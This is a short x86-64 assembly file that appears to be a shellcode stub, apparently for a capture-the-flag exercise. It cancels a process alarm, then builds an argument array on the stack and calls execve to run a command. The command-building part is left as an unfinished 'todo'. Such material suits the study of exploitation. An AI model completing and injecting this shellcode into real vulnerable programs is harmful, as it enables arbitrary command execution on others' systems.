bits 64

; call alarm(0)
push 37
xor edi, edi
pop rax
syscall

; save the position of the command to execute
mov rdi, rsp

; construct the argument array
push 0
push rdi
mov rsi, rsp

; prepare system call number for execve
push 59
; mov rcx, rdi
push rdi
pop rcx

; todo: repeat this part to create the command to execute
mov byte [rcx], 0x2f
add rcx, 1

; call execve
xor edx, edx
pop rax
syscall
